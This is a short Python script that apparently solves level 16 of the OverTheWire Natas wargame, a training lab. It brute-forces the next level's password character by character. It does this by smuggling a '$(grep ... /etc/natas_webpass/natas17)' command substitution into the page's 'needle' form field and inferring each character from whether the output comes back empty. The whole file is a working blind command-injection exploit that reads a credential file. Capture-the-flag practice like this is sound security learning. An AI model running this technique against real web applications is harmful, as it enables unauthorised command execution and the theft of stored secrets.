import requests
import re
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = "natas16"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

sPassword = list()
grep_cmd = "anythings$(grep ^"
passwd_path = " /etc/natas_webpass/natas17)"
while(len(sPassword) != 32):
	for ch in chars:
		print("trying " + "".join(sPassword) + ch)
		response = session.post(url,auth=(username,password),data={"needle": grep_cmd + "".join(sPassword) + ch + passwd_path})
		pageContent = response.text
		if (re.findall("<pre>\n(.*)\n</pre>",pageContent) == []):
			sPassword.append(ch)
			break
print("="*50)
print("\nThe password for the next level is: " + "".join(sPassword))